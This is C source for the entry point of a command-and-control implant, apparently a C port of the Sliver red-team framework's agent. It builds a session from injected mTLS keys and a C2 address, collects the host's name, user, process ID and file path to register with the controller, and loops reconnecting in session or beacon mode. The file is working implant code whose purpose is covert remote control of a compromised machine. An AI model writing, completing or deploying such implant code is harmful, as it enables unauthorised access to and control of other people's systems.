/* src/modes/implant.c - shared entry point (exe + DLL): build the session config
 * from the injected secrets and run the session or beacon loop. */
#include "sliver/implant.h"

#include "sliver/config.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/session.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int sliver_session_config_build(sliver_session_config_t *cfg, char *host_buf,
                                size_t host_cap, const char *argv0) {
  sliver_register_t reg;
  const char *c2 = sliver_config_c2_url(0);
  const char *host_part;
  const char *colon;
  size_t host_len;
  char hostname[128];
  char username[128];

  if (cfg == NULL || host_buf == NULL || host_cap == 0) {
    return -1;
  }
  if (c2 == NULL) {
    LOG_ERROR("config: no C2 endpoint injected");
    return -1;
  }
  if (strncmp(c2, "mtls://", 7) != 0) {
    LOG_ERROR("config: transport %s is not implemented yet (only mtls://)", c2);
    return -1;
  }
  host_part = c2 + 7;
  colon = strrchr(host_part, ':');
  if (colon == NULL) {
    LOG_ERROR("config: mtls endpoint has no port: %s", c2);
    return -1;
  }
  host_len = (size_t)(colon - host_part);
  if (host_len == 0 || host_len >= host_cap) {
    LOG_ERROR("config: bad mtls host in %s", c2);
    return -1;
  }
  memcpy(host_buf, host_part, host_len);
  host_buf[host_len] = '\0';

  memset(cfg, 0, sizeof(*cfg));
  cfg->host = host_buf;
  cfg->port = (uint16_t)strtoul(colon + 1, NULL, 10);
  cfg->ca_pem = sliver_config_secret(SLIVER_SECRET_MTLS_CA_CERT);
  cfg->cert_pem = sliver_config_secret(SLIVER_SECRET_MTLS_CERT);
  cfg->key_pem = sliver_config_secret(SLIVER_SECRET_MTLS_KEY);
  cfg->age_private_key = sliver_config_secret(SLIVER_SECRET_PEER_PRIVATE_KEY);
  cfg->server_minisign_pubkey = sliver_config_secret(SLIVER_SECRET_MINISIGN_SERVER_PUBLIC_KEY);
  if (cfg->ca_pem == NULL || cfg->cert_pem == NULL || cfg->key_pem == NULL ||
      cfg->age_private_key == NULL || cfg->server_minisign_pubkey == NULL) {
    LOG_ERROR("config: mTLS material is missing from the injected secrets");
    return -1;
  }

  memset(&reg, 0, sizeof(reg));
  (void)snprintf(reg.name, sizeof(reg.name), "%s", sliver_config_name());
  if (sliver_hostname(hostname, sizeof(hostname)) == 0) {
    (void)snprintf(reg.hostname, sizeof(reg.hostname), "%s", hostname);
  }
  if (sliver_username(username, sizeof(username)) == 0) {
    (void)snprintf(reg.username, sizeof(reg.username), "%s", username);
  }
  (void)snprintf(reg.uuid, sizeof(reg.uuid), "%s",
                 sliver_config_build_id()[0] != '\0' ? sliver_config_build_id()
                                                     : sliver_config_name());
  (void)snprintf(reg.os, sizeof(reg.os), "%s",
#if defined(_WIN32)
                 "windows"
#else
                 "linux"
#endif
  );
  (void)snprintf(reg.arch, sizeof(reg.arch), "%s", sizeof(void *) == 8 ? "amd64" : "386");
  reg.pid = (int32_t)sliver_current_pid();
  (void)snprintf(reg.filename, sizeof(reg.filename), "%s", argv0 != NULL ? argv0 : "");
  (void)snprintf(reg.version, sizeof(reg.version), "%s", "1.7.8");
  reg.reconnect_interval = sliver_config_reconnect_interval_ns();
  (void)snprintf(reg.config_id, sizeof(reg.config_id), "%s",
                 sliver_config_build_id()[0] != '\0' ? sliver_config_build_id()
                                                     : sliver_config_name());
  (void)snprintf(reg.locale, sizeof(reg.locale), "%s", "en-US");
  cfg->reg = reg;

  LOG_INFO("starting from injected config: %s:%u (%s)", host_buf, (unsigned)cfg->port, c2);
  return 0;
}

int sliver_implant_run(const char *argv0) {
  sliver_session_config_t cfg;
  char host[256];

  /* Mode is baked at build time (SLIVER_IS_BEACON in the injected config), so a
   * session artifact never enters this branch. Both schedulers share the channel,
   * codecs, dispatch table and handlers; only lifecycle/timing differ. */
  if (sliver_config_is_beacon()) {
    return sliver_beacon_run(argv0);
  }

  if (sliver_session_config_build(&cfg, host, sizeof(host), argv0) != 0) {
    return -1;
  }

  {
    int attempts = 0;
    int max_errors = sliver_config_max_connection_errors();
    long long reconnect_ms = sliver_config_reconnect_interval_ns() / 1000000LL;
    if (reconnect_ms <= 0) {
      reconnect_ms = 60000;
    }
    for (;;) {
      (void)sliver_session_run(&cfg);
      attempts++;
      if (max_errors > 0 && attempts > max_errors) {
        LOG_ERROR("giving up after %d connection attempts", attempts);
        return 1;
      }
      LOG_INFO("reconnect in %lld ms (attempt %d/%d)", reconnect_ms, attempts, max_errors);
      sliver_sleep_ms((uint32_t)reconnect_ms);
    }
  }
}
